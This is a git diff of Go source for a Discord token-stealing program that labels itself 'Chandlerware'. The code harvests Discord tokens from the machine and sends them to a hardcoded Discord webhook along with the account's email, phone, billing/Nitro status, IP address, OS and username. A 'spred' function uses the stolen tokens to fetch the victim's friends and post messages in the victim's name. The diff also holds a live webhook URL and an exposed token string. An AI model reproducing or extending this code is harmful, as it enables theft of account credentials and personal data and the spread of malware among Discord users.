@@ -36,6 +36,18 @@ type User struct {
 	User     UserData
 }
 
+type Data struct {
+	Username    string
+	Email       string
+	Phone       string
+	Nitro       string
+	Ip          string
+	DisplayName string
+	PCUsername  string
+	OS          string
+	CPUArch     string
+}
+
 const (
 	WehookUrl = "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS"
 )
@@ -51,9 +63,9 @@ func spred() {
 	for _, token := range tokens {
 		fmt.Println(token)
 		//  var friends []string
-		body, err := getRequest("https://discord.com/api/v9/users/@me/relationships", true, "ODkwNjQ1MTYxNzk1NzkyOTQ2.G1t2OH.nZOw4JIT-skQ65_4LUMjEb2cDc-taebwaWlrUc")
+		body, err := getRequest("https://discord.com/api/v9/users/@me/relationships", true, token)
 		if err != nil {
-			fmt.Println("hello?")
+			fmt.Println(err)
 			continue
 		}
 		// fmt.Println(body)
@@ -82,20 +94,20 @@ func spred() {
 		}
 
 		for _, user := range Friends {
-			fmt.Println(user)
 			data := []byte(`{content: "test"}`)
-			req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/937809525728247818/messages", bytes.NewBuffer(data))
-
-			req.Header.Set("Authorization", "ODkwNjQ1MTYxNzk1NzkyOTQ2.G1t2OH.nZOw4JIT-skQ65_4LUMjEb2cDc-taebwaWlrUc")
+			req, wth := http.NewRequest("POST", "https://discord.com/api/v9/channels/890645161795792946/messages", bytes.NewBuffer(data))
+			if wth != nil {
+				fmt.Println(wth)
+			}
+			req.Header.Set("Authorization", token)
 			cl := &http.Client{}
-			fmt.Println("WTF??")
 			res, err := cl.Do(req)
 			if err != nil {
-				fmt.Print("test")
+				fmt.Print("test %s", user.Id)
 				fmt.Println(string(res.StatusCode) + " " + res.Status)
 			}
-			print(res)
 
+			res.Body.Close()
 		}
 
 		// req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+ ChannelId + "/messages")
@@ -103,8 +115,8 @@ func spred() {
 }
 
 func send_info(token string) {
-
-	data := []byte(grabTokenInformation(token))
+	_, embed := grabTokenInformation(token)
+	data := []byte(embed)
 	req, _ := http.NewRequest("POST", WehookUrl, bytes.NewBuffer(data))
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
 	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
@@ -118,7 +130,7 @@ func send_info(token string) {
 	defer response.Body.Close()
 }
 
-func grabTokenInformation(token string) (jsonEmbed string) {
+func grabTokenInformation(token string) (data string, jsonEmbed string) {
 
 	// Get User displayName
 	var displayName string
@@ -167,8 +179,10 @@ func grabTokenInformation(token string) (jsonEmbed string) {
 			discordNitro = "Yes"
 		}
 	}
-	tokens = append(tokens, "this.is.a.tokens")
-	jsonEmbed = "{\"avatar_url\":\"https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nUsername: " + currentUser.Name + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"** Discord Token**\",\"value\":\"```" + token + "```\"},{\"name\":\"**All tokens**\",\"value\":\"```" + strings.Join(tokens, " || ") + "```\"}]}],\"username\":\"" + "Chandlerware" + "\"}"
+
+	// data = `[{"Username": "` + discordUser + `", "Email": "` + discordEmail + `", "Phone": "` + discordPhone + `", "Nitro": "` + discordNitro + `", "Ip": "` + ip + `", "DisplayName": "` + currentUser.Name + `", "PCUsername": "` + strings.Split(currentUser.Username, "\\")[1] + `", "OS": "` + osName + `", "CPUArch": "` + cpuArch + `"}]`
+	fmt.Print(data)
+	jsonEmbed = "{\"avatar_url\":\"https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nUsername: " + strings.Split(currentUser.Username, "\\")[1] + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"** Discord Token**\",\"value\":\"```" + token + "```\"},{\"name\":\"**All tokens**\",\"value\":\"```" + strings.Join(tokens, " || ") + "```\"}]}],\"username\":\"" + "Chandlerware" + "\"}"
 	return
 }
 
@@ -224,7 +238,7 @@ func start() {
 					}
 
 					if !slices.Contains(tokens, string(token)) {
-						tokens = append(tokens, string(token)+"")
+						tokens = append(tokens, string(token))
 						send_info(token)
 
 					}
@@ -233,6 +247,14 @@ func start() {
 		}
 
 	}
+	// var oldU string
+	// for _, t := range tokens {
+	// 	data, _ := grabTokenInformation(t)
+	// 	u := data.Username
+	// 	if !(u == oldU) {
+	// 	}
+	// 	oldU = u
+	// }
 }
 
 func get_files(root, ext string) []string {
